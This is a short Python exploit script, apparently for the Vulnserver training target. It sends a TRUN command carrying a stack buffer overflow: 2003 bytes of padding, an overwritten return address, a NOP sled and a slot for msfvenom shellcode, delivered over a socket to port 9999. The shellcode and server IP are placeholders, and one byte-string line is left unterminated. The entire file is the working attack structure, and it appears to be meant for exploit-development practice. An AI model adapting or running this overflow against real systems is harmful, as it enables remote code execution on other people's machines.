import socket
import struct
s = socket.socket()
s.connect(("<ServerIP>",9999))
buf =  b""
buf += b"<Add the shell code from msfvenom here>
shellcode = buf
nops = b"\x90"*16
leng = 2984
offset = 2003
eip = struct.pack("<I",0x62501203)
payload = [b"TRUN /.:/",b"A"*offset,eip,nops,shellcode,b"C"*(leng - offset
- len(eip) - len(nops) - len(shellcode))]
payload = b"".join(payload)
s.send(payload)
s.close()
